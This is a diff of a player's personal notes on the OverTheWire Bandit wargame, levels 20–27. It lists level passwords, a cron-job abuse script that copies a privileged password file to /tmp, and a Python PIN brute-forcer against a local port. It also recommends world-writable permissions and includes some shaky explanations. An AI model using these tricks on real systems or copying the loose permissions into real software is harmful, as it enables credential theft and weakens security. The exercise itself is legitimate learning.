@@ -1,6 +1,6 @@
 https://overthewire.org/wargames/bandit/
 
-ssh bandit12@bandit.labs.overthewire.org -p 2220
+ssh bandit24@bandit.labs.overthewire.org -p 2220
 Each password refers to the password for the next level (flag found in that level)
 bandit0
 
@@ -81,3 +81,131 @@ ex: ssh bandit18@bandit.labs.overthewire.org -p 2220 /bin/sh
 
 level 19:
 GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+level 20:
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+had to use nc -l <PORT NUMBER> to create an open port
+
+level 21:
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+cat /etc/cron.d/cronjob_bandit22
+
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+
+the 5 astericks means that this file is being ran every single minute, its output
+is redirected towards /dev/null (which is just a void file)
+
+cat /usr/bin/cronjob_bandit22.sh
+
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+level 22:
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+cat /etc/cron.d/cronjob_bandit23
+
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+
+
+cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+mytarget = 8ca319486bfbbc3663ea0fbe81326349
+
+#the trick here is that you can calculate the md5 hash yourself
+#instead of using $myname as bandit22, you can make $myname to be bandit23 and get the pass
+
+level 23:
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+NOTE:
+2 things got me stuck on this level
+first thing was forgetting about file permissions
+file permissions can be changed with chmod
+to let anyone execute a file, you have to make sure it has the right permissions
+one way to do this is "chmod 777 <FILE NAME>"
+directories can also be chmod 666 <DIRECTORY> so that anyone can write to them
+the second thing is that you need to put #!/bin/bash for bash scripts
+
+cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+#/var/spool/bandit24 you can access / write to
+
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+My Script (given slayerban24 dir was already created with the right permissions):
+
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/slayerban24/testFile
+
+Level 24:
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+import socket
+
+password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+with socket.socket() as s:
+    s.connect(("127.0.0.1", 30002))
+    print(s.recv(1024))
+    for i in range(2000,10000):
+        s.sendall(bytes(password + " " + str(i).zfill(4) + "\n", encoding="UTF-8"))
+        if not str(s.recv(1024)).__contains__("Wrong"):
+            print("pincode is " + str(i).zfill(4))
+            exit()
+        else:
+            print("pincode is not " + str(i).zfill(4))
+
+
+Level 25:
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+I did cheat on this one
+Notes: /etc/passwd stores special things about different users (ex. what shell will be executed)
+the "more" command helps you read files line by line
+the "more" command will only actually do something if your terminal window can not fit the whole file in one screen
+you can press "v" on the more command to access vim
+once you are in vim, you can do :e <file> to edit that file
+
+level 26:
+I cheated on this one too, because its cringe
+do keep in mind, a "shell" is something that just like accepts input
+bash is a powerful shell
+technically /bin/echo is also a shell, which does nothing but echo
+3ba3118a22e93127a4ed485be72ef5ea
+
+level 27:
+0ef186ac70e04ea33b4c1853d2526fa2
